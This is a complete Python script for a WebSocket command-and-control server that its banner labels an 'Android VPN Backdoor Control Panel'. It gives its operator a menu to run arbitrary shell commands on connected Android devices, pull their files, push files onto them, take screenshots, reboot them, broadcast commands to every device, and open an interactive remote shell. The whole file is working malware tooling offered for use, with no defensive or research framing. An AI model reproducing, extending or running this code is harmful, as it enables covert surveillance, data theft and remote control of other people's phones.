#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import base64
import os
import sys
import time
import datetime
import threading
import signal
from typing import Dict, Optional

# Try to import websocket-server
try:
    from websocket_server import WebsocketServer
except ImportError:
    print("Error: websocket-server library not installed.")
    print("Run: pip install websocket-server colorama")
    sys.exit(1)

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    # Fallback if colorama not installed
    class Fore:
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        RESET = '\033[0m'
    
    class Style:
        BRIGHT = '\033[1m'
        RESET_ALL = '\033[0m'

# Configuration
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 8083

# Store connected devices
connected_devices = {}
device_info = {}
command_history = {}
response_buffer = {}
response_timeout = 30

# Colors
C = {
    'HEADER': Fore.CYAN + Style.BRIGHT,
    'BLUE': Fore.BLUE,
    'GREEN': Fore.GREEN,
    'YELLOW': Fore.YELLOW,
    'RED': Fore.RED,
    'MAGENTA': Fore.MAGENTA,
    'WHITE': Fore.WHITE,
    'RESET': Fore.RESET,
    'BOLD': Style.BRIGHT
}

def print_banner():
    """Print fancy banner"""
    banner = f"""
{C['HEADER']}╔══════════════════════════════════════════════════════════════╗
{C['HEADER']}║                                                              ║
{C['HEADER']}║  {C['MAGENTA']}██████╗  █████╗  ██████╗██╗  ██╗██████╗  ██████╗  ║
{C['HEADER']}║  {C['MAGENTA']}██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗ ║
{C['HEADER']}║  {C['MAGENTA']}██████╔╝███████║██║     █████╔╝ ██║  ██║██║   ██║ ║
{C['HEADER']}║  {C['MAGENTA']}██╔══██╗██╔══██║██║     ██╔═██╗ ██║  ██║██║   ██║ ║
{C['HEADER']}║  {C['MAGENTA']}██████╔╝██║  ██║╚██████╗██║  ██╗██████╔╝╚██████╔╝ ║
{C['HEADER']}║  {C['MAGENTA']}╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ║
{C['HEADER']}║                                                              ║
{C['HEADER']}║         {C['GREEN']}Android VPN Backdoor Control Panel{C['HEADER']}           ║
{C['HEADER']}║         {C['YELLOW']}Server: {SERVER_HOST}:{SERVER_PORT}{C['HEADER']}               ║
{C['HEADER']}╚══════════════════════════════════════════════════════════════╝
{C['RESET']}
"""
    print(banner)

def print_menu():
    """Print main menu"""
    menu = f"""
{C['GREEN']}╔══════════════════════════════════════════════════════════════╗
{C['GREEN']}║                    {C['WHITE']}COMMAND MENU{C['GREEN']}                         ║
{C['GREEN']}╠══════════════════════════════════════════════════════════════╣
{C['GREEN']}║  {C['YELLOW']}1.{C['RESET']} List connected devices                          {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}2.{C['RESET']} Send shell command to device                    {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}3.{C['RESET']} Download file from device                       {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}4.{C['RESET']} Upload file to device                           {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}5.{C['RESET']} List files on device                            {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}6.{C['RESET']} Take screenshot                                 {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}7.{C['RESET']} Get device info                                 {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}8.{C['RESET']} Ping device                                     {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}9.{C['RESET']} Reboot device                                   {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}10.{C['RESET']}View command history for device                {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}11.{C['RESET']}Broadcast command to ALL devices                {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}12.{C['RESET']}Interactive shell mode                          {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}0.{C['RESET']} Exit                                            {C['GREEN']}║
{C['GREEN']}╚══════════════════════════════════════════════════════════════╝
{C['RESET']}
"""
    print(menu)

def get_devices_list():
    """Get list of connected device IDs"""
    return list(connected_devices.keys())

def select_device(prompt="Select device ID"):
    """Interactive device selection"""
    devices = get_devices_list()
    
    if not devices:
        print(f"{C['RED']}❌ No devices connected!{C['RESET']}")
        return None
    
    print(f"\n{C['YELLOW']}Connected devices:{C['RESET']}")
    for i, device in enumerate(devices, 1):
        info = device_info.get(device, {})
        model = info.get('model', 'Unknown')
        print(f"  {C['GREEN']}{i}.{C['RESET']} {C['WHITE']}{device[:16]}...{C['RESET']} ({C['BLUE']}{model}{C['RESET']})")
    
    while True:
        try:
            choice = input(f"\n{C['YELLOW']}Enter device number (or 'q' to cancel): {C['RESET']}")
            if choice.lower() == 'q':
                return None
            idx = int(choice) - 1
            if 0 <= idx < len(devices):
                return devices[idx]
            else:
                print(f"{C['RED']}Invalid selection!{C['RESET']}")
        except ValueError:
            print(f"{C['RED']}Please enter a valid number!{C['RESET']}")

def send_command_to_device(client, device_id, command):
    """Send command to a specific device"""
    if device_id not in connected_devices:
        print(f"{C['RED']}❌ Device {device_id} not connected!{C['RESET']}")
        return False
    
    try:
        # Send command to client
        client.send_message(connected_devices[device_id], json.dumps(command))
        
        # Log command history
        if device_id not in command_history:
            command_history[device_id] = []
        command_history[device_id].append({
            'time': datetime.datetime.now().isoformat(),
            'command': command,
            'status': 'sent'
        })
        
        print(f"{C['GREEN']}✅ Command sent to {device_id[:16]}...{C['RESET']}")
        return True
    except Exception as e:
        print(f"{C['RED']}❌ Failed to send command: {e}{C['RESET']}")
        return False

def handle_device_info(device_id, data):
    """Handle device info message"""
    device_info[device_id] = data
    model = data.get('model', 'Unknown')
    android_version = data.get('android_version', 'Unknown')
    print(f"\n{C['GREEN']}📱 Device connected:{C['RESET']}")
    print(f"  {C['WHITE']}ID:{C['RESET']} {device_id}")
    print(f"  {C['WHITE']}Model:{C['RESET']} {model}")
    print(f"  {C['WHITE']}Android:{C['RESET']} {android_version}")
    print(f"  {C['WHITE']}App Version:{C['RESET']} {data.get('app_version', 'Unknown')}")
    print(f"{C['GREEN']}─" * 50 + f"{C['RESET']}")

def handle_command_response(device_id, data):
    """Handle command response from device"""
    cmd_type = data.get('type', 'unknown')
    
    if cmd_type == 'exec_result':
        output = data.get('output', '')
        error = data.get('error', '')
        exit_code = data.get('exit_code', -1)
        
        print(f"\n{C['MAGENTA']}═" * 50 + f"{C['RESET']}")
        print(f"{C['GREEN']}📤 Command Result from {device_id[:16]}...{C['RESET']}")
        print(f"{C['MAGENTA']}─" * 50 + f"{C['RESET']}")
        
        if output:
            print(f"{C['WHITE']}Output:{C['RESET']}")
            print(f"{C['GREEN']}{output}{C['RESET']}")
        
        if error:
            print(f"{C['RED']}Errors:{C['RESET']}")
            print(f"{C['RED']}{error}{C['RESET']}")
        
        print(f"{C['YELLOW']}Exit Code: {exit_code}{C['RESET']}")
        print(f"{C['MAGENTA']}═" * 50 + f"{C['RESET']}\n")
    
    elif cmd_type == 'file_download':
        file_path = data.get('path', 'unknown')
        file_size = data.get('size', 0)
        file_content = data.get('base64', '')
        
        print(f"\n{C['GREEN']}📥 File downloaded from {device_id[:16]}...{C['RESET']}")
        print(f"  {C['WHITE']}Path:{C['RESET']} {file_path}")
        print(f"  {C['WHITE']}Size:{C['RESET']} {file_size} bytes")
        
        if file_content:
            try:
                filename = os.path.basename(file_path)
                if not filename:
                    filename = f"downloaded_{int(time.time())}.bin"
                
                file_data = base64.b64decode(file_content)
                save_path = os.path.join('downloads', filename)
                
                os.makedirs('downloads', exist_ok=True)
                
                with open(save_path, 'wb') as f:
                    f.write(file_data)
                
                print(f"  {C['GREEN']}Saved to:{C['RESET']} {save_path}")
            except Exception as e:
                print(f"  {C['RED']}Error saving file: {e}{C['RESET']}")
        
        print(f"{C['GREEN']}─" * 50 + f"{C['RESET']}\n")
    
    elif cmd_type == 'file_list':
        directory = data.get('directory', '/sdcard')
        files = data.get('files', [])
        
        print(f"\n{C['GREEN']}📂 File list from {device_id[:16]}...{C['RESET']}")
        print(f"  {C['WHITE']}Directory:{C['RESET']} {directory}")
        print(f"{C['MAGENTA']}─" * 50 + f"{C['RESET']}")
        
        if files:
            for file_info in files:
                name = file_info.get('name', '')
                size = file_info.get('size', 0)
                is_dir = file_info.get('is_directory', False)
                
                icon = "📁" if is_dir else "📄"
                size_str = f"{size:,} bytes" if size > 0 else "-"
                
                print(f"  {icon} {C['WHITE']}{name}{C['RESET']} ({C['BLUE']}{size_str}{C['RESET']})")
        else:
            print(f"  {C['YELLOW']}No files found or empty directory{C['RESET']}")
        
        print(f"{C['GREEN']}─" * 50 + f"{C['RESET']}\n")
    
    elif cmd_type == 'response':
        status = data.get('status', 'unknown')
        message = data.get('message', '')
        
        if status == 'success':
            print(f"{C['GREEN']}✅ Success: {message}{C['RESET']}")
        elif status == 'pong':
            print(f"{C['GREEN']}🏓 Pong received from {device_id[:16]}...{C['RESET']}")
        else:
            print(f"{C['RED']}❌ {status}: {message}{C['RESET']}")
    
    elif cmd_type == 'device_info':
        handle_device_info(device_id, data)
    
    else:
        print(f"{C['YELLOW']}📩 Received: {json.dumps(data, indent=2)}{C['RESET']}")

# ================= WEBSOCKET SERVER CALLBACKS =================

def new_client(client, server):
    """Called when a new client connects"""
    # Get device ID from headers
    device_id = client.get('headers', {}).get('x-device-id', 'unknown')
    
    if device_id == 'unknown':
        device_id = f"device_{client['id']}"
    
    # Store connection
    connected_devices[device_id] = client
    print(f"{C['GREEN']}✅ Device connected: {device_id[:16]}...{C['RESET']}")

def client_left(client, server):
    """Called when a client disconnects"""
    # Find and remove device
    for device_id, ws_client in list(connected_devices.items()):
        if ws_client['id'] == client['id']:
            connected_devices.pop(device_id, None)
            print(f"{C['RED']}❌ Device disconnected: {device_id[:16]}...{C['RESET']}")
            break

def message_received(client, server, message):
    """Called when a message is received from a client"""
    # Find device ID
    device_id = None
    for did, ws_client in connected_devices.items():
        if ws_client['id'] == client['id']:
            device_id = did
            break
    
    if not device_id:
        device_id = f"unknown_{client['id']}"
    
    try:
        data = json.loads(message)
        handle_command_response(device_id, data)
    except json.JSONDecodeError:
        print(f"{C['YELLOW']}📩 Received binary from {device_id[:16]}... (size: {len(message)} bytes){C['RESET']}")

# ================= COMMAND FUNCTIONS =================

def cmd_list_devices():
    """Command: List connected devices"""
    devices = get_devices_list()
    
    if not devices:
        print(f"\n{C['YELLOW']}⚠️ No devices connected!{C['RESET']}\n")
        return
    
    print(f"\n{C['GREEN']}═" * 60 + f"{C['RESET']}")
    print(f"{C['WHITE']}{'Connected Devices':^60}{C['RESET']}")
    print(f"{C['GREEN']}═" * 60 + f"{C['RESET']}")
    
    for i, device_id in enumerate(devices, 1):
        info = device_info.get(device_id, {})
        model = info.get('model', 'Unknown')
        android = info.get('android_version', '?')
        
        print(f"\n{C['YELLOW']}{i}.{C['RESET']}")
        print(f"  {C['WHITE']}Device ID:{C['RESET']} {device_id}")
        print(f"  {C['WHITE']}Model:{C['RESET']} {model}")
        print(f"  {C['WHITE']}Android:{C['RESET']} {android}")
        print(f"  {C['WHITE']}Status:{C['RESET']} {C['GREEN']}● Online{C['RESET']}")
    
    print(f"\n{C['GREEN']}═" * 60 + f"{C['RESET']}\n")

def cmd_execute_command(server):
    """Command: Execute shell command on device"""
    device_id = select_device()
    if not device_id:
        return
    
    command = input(f"\n{C['YELLOW']}Enter shell command to execute: {C['RESET']}")
    if not command:
        print(f"{C['RED']}❌ Command cannot be empty!{C['RESET']}")
        return
    
    cmd_data = {
        "cmd": "exec",
        "command": command
    }
    
    send_command_to_device(server, device_id, cmd_data)

def cmd_download_file(server):
    """Command: Download file from device"""
    device_id = select_device()
    if not device_id:
        return
    
    file_path = input(f"\n{C['YELLOW']}Enter file path on device: {C['RESET']}")
    if not file_path:
        print(f"{C['RED']}❌ File path cannot be empty!{C['RESET']}")
        return
    
    cmd_data = {
        "cmd": "download",
        "path": file_path
    }
    
    send_command_to_device(server, device_id, cmd_data)

def cmd_upload_file(server):
    """Command: Upload file to device"""
    device_id = select_device()
    if not device_id:
        return
    
    local_path = input(f"\n{C['YELLOW']}Enter local file path to upload: {C['RESET']}")
    if not local_path or not os.path.exists(local_path):
        print(f"{C['RED']}❌ File not found!{C['RESET']}")
        return
    
    remote_path = input(f"{C['YELLOW']}Enter remote path on device: {C['RESET']}")
    if not remote_path:
        remote_path = os.path.basename(local_path)
    
    try:
        with open(local_path, 'rb') as f:
            file_data = base64.b64encode(f.read()).decode('utf-8')
        
        cmd_data = {
            "cmd": "upload",
            "path": remote_path,
            "data": file_data
        }
        
        send_command_to_device(server, device_id, cmd_data)
    except Exception as e:
        print(f"{C['RED']}❌ Failed to read file: {e}{C['RESET']}")

def cmd_list_files(server):
    """Command: List files on device"""
    device_id = select_device()
    if not device_id:
        return
    
    directory = input(f"\n{C['YELLOW']}Enter directory path (default: /sdcard): {C['RESET']}")
    if not directory:
        directory = "/sdcard"
    
    cmd_data = {
        "cmd": "list_files",
        "directory": directory
    }
    
    send_command_to_device(server, device_id, cmd_data)

def cmd_take_screenshot(server):
    """Command: Take screenshot on device"""
    device_id = select_device()
    if not device_id:
        return
    
    cmd_data = {
        "cmd": "screenshot"
    }
    
    send_command_to_device(server, device_id, cmd_data)

def cmd_get_info(server):
    """Command: Get device info"""
    device_id = select_device()
    if not device_id:
        return
    
    cmd_data = {
        "cmd": "get_info"
    }
    
    send_command_to_device(server, device_id, cmd_data)

def cmd_ping(server):
    """Command: Ping device"""
    device_id = select_device()
    if not device_id:
        return
    
    cmd_data = {
        "cmd": "ping"
    }
    
    send_command_to_device(server, device_id, cmd_data)

def cmd_reboot(server):
    """Command: Reboot device"""
    device_id = select_device()
    if not device_id:
        return
    
    confirm = input(f"\n{C['RED']}⚠️ Are you sure you want to reboot the device? (y/n): {C['RESET']}")
    if confirm.lower() != 'y':
        print(f"{C['YELLOW']}❌ Reboot cancelled{C['RESET']}")
        return
    
    cmd_data = {
        "cmd": "reboot"
    }
    
    send_command_to_device(server, device_id, cmd_data)

def cmd_view_history():
    """Command: View command history for device"""
    device_id = select_device()
    if not device_id:
        return
    
    history = command_history.get(device_id, [])
    
    if not history:
        print(f"\n{C['YELLOW']}⚠️ No command history for this device{C['RESET']}\n")
        return
    
    print(f"\n{C['MAGENTA']}═" * 60 + f"{C['RESET']}")
    print(f"{C['WHITE']}{'Command History':^60}{C['RESET']}")
    print(f"{C['MAGENTA']}═" * 60 + f"{C['RESET']}")
    
    for i, entry in enumerate(history[-20:], 1):
        time_str = entry.get('time', '')
        cmd = entry.get('command', {})
        status = entry.get('status', '')
        
        print(f"\n{C['YELLOW']}{i}.{C['RESET']} {C['BLUE']}{time_str}{C['RESET']}")
        print(f"   {C['WHITE']}Command:{C['RESET']} {json.dumps(cmd)}")
        print(f"   {C['WHITE']}Status:{C['RESET']} {C['GREEN']}{status}{C['RESET']}")
    
    print(f"\n{C['MAGENTA']}═" * 60 + f"{C['RESET']}\n")

def cmd_broadcast(server):
    """Command: Broadcast command to all devices"""
    devices = get_devices_list()
    if not devices:
        print(f"\n{C['RED']}❌ No devices connected!{C['RESET']}\n")
        return
    
    command = input(f"\n{C['YELLOW']}Enter command to broadcast: {C['RESET']}")
    if not command:
        print(f"{C['RED']}❌ Command cannot be empty!{C['RESET']}")
        return
    
    cmd_data = {
        "cmd": "exec",
        "command": command
    }
    
    print(f"\n{C['GREEN']}📢 Broadcasting to {len(devices)} devices...{C['RESET']}")
    for device_id in devices:
        send_command_to_device(server, device_id, cmd_data)
    
    print(f"{C['GREEN']}✅ Broadcast complete!{C['RESET']}\n")

def cmd_interactive_shell(server):
    """Command: Interactive shell mode"""
    device_id = select_device()
    if not device_id:
        return
    
    print(f"\n{C['GREEN']}═" * 60 + f"{C['RESET']}")
    print(f"{C['GREEN']}📱 Interactive Shell Mode for {device_id[:16]}...{C['RESET']}")
    print(f"{C['YELLOW']}Type 'exit' to quit, 'help' for commands{C['RESET']}")
    print(f"{C['GREEN']}═" * 60 + f"{C['RESET']}\n")
    
    while True:
        try:
            cmd = input(f"{C['GREEN']}shell>{C['RESET']} ")
            
            if not cmd:
                continue
            
            if cmd.lower() == 'exit':
                print(f"{C['YELLOW']}🔚 Exiting interactive mode{C['RESET']}")
                break
            
            if cmd.lower() == 'help':
                print(f"\n{C['WHITE']}Available commands:{C['RESET']}")
                print(f"  {C['YELLOW']}exit{C['RESET']} - Exit interactive mode")
                print(f"  {C['YELLOW']}help{C['RESET']} - Show this help")
                print(f"  {C['YELLOW']}clear{C['RESET']} - Clear screen")
                print(f"  {C['YELLOW']}download <path>{C['RESET']} - Download file")
                print(f"  {C['YELLOW']}ls <path>{C['RESET']} - List files")
                print(f"  {C['YELLOW']}screenshot{C['RESET']} - Take screenshot")
                print(f"  {C['YELLOW']}info{C['RESET']} - Get device info")
                print(f"\n{C['WHITE']}Other commands will be executed as shell commands{C['RESET']}\n")
                continue
            
            if cmd.lower() == 'clear':
                os.system('clear' if os.name == 'posix' else 'cls')
                continue
            
            parts = cmd.split(' ', 1)
            special = parts[0].lower()
            
            if special == 'download' and len(parts) > 1:
                send_command_to_device(server, device_id, {"cmd": "download", "path": parts[1]})
            elif special == 'ls' and len(parts) > 1:
                send_command_to_device(server, device_id, {"cmd": "list_files", "directory": parts[1]})
            elif special == 'ls':
                send_command_to_device(server, device_id, {"cmd": "list_files", "directory": "/sdcard"})
            elif special == 'screenshot':
                send_command_to_device(server, device_id, {"cmd": "screenshot"})
            elif special == 'info':
                send_command_to_device(server, device_id, {"cmd": "get_info"})
            else:
                send_command_to_device(server, device_id, {"cmd": "exec", "command": cmd})
            
            time.sleep(1)
            
        except KeyboardInterrupt:
            print(f"\n{C['YELLOW']}🔚 Exiting interactive mode{C['RESET']}")
            break
        except Exception as e:
            print(f"{C['RED']}❌ Error: {e}{C['RESET']}")

def signal_handler(sig, frame):
    """Handle Ctrl+C"""
    print(f"\n{C['YELLOW']}🔚 Shutting down server...{C['RESET']}")
    sys.exit(0)

# ================= MAIN =================

def main():
    """Main function"""
    signal.signal(signal.SIGINT, signal_handler)
    
    os.system('clear' if os.name == 'posix' else 'cls')
    print_banner()
    
    # Create downloads directory
    os.makedirs('downloads', exist_ok=True)
    
    print(f"{C['GREEN']}🚀 Starting WebSocket server on {SERVER_HOST}:{SERVER_PORT}{C['RESET']}")
    print(f"{C['YELLOW']}📡 Waiting for Android devices to connect...{C['RESET']}\n")
    
    # Create and start server
    server = WebsocketServer(host=SERVER_HOST, port=SERVER_PORT)
    server.set_fn_new_client(new_client)
    server.set_fn_client_left(client_left)
    server.set_fn_message_received(message_received)
    
    # Run server in a separate thread
    import threading
    server_thread = threading.Thread(target=server.run_forever, daemon=True)
    server_thread.start()
    
    print(f"{C['GREEN']}✅ Server started successfully!{C['RESET']}")
    print(f"{C['WHITE']}Press Ctrl+C to stop the server{C['RESET']}\n")
    
    # Main menu loop
    while True:
        try:
            print_menu()
            choice = input(f"\n{C['YELLOW']}Enter your choice: {C['RESET']}")
            
            if choice == '0':
                print(f"\n{C['YELLOW']}🔚 Shutting down server...{C['RESET']}")
                break
            
            elif choice == '1':
                cmd_list_devices()
            
            elif choice == '2':
                cmd_execute_command(server)
            
            elif choice == '3':
                cmd_download_file(server)
            
            elif choice == '4':
                cmd_upload_file(server)
            
            elif choice == '5':
                cmd_list_files(server)
            
            elif choice == '6':
                cmd_take_screenshot(server)
            
            elif choice == '7':
                cmd_get_info(server)
            
            elif choice == '8':
                cmd_ping(server)
            
            elif choice == '9':
                cmd_reboot(server)
            
            elif choice == '10':
                cmd_view_history()
            
            elif choice == '11':
                cmd_broadcast(server)
            
            elif choice == '12':
                cmd_interactive_shell(server)
            
            else:
                print(f"{C['RED']}❌ Invalid choice! Please try again.{C['RESET']}")
            
            input(f"\n{C['YELLOW']}Press Enter to continue...{C['RESET']}")
            os.system('clear' if os.name == 'posix' else 'cls')
            print_banner()
            
        except KeyboardInterrupt:
            print(f"\n{C['YELLOW']}🔚 Shutting down server...{C['RESET']}")
            break
        except Exception as e:
            print(f"{C['RED']}❌ Error: {e}{C['RESET']}")
    
    # Cleanup
    server.shutdown()
    print(f"{C['GREEN']}✅ Server stopped successfully!{C['RESET']}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C['YELLOW']}🔚 Exiting...{C['RESET']}")
    except Exception as e:
        print(f"{C['RED']}❌ Fatal error: {e}{C['RESET']}")
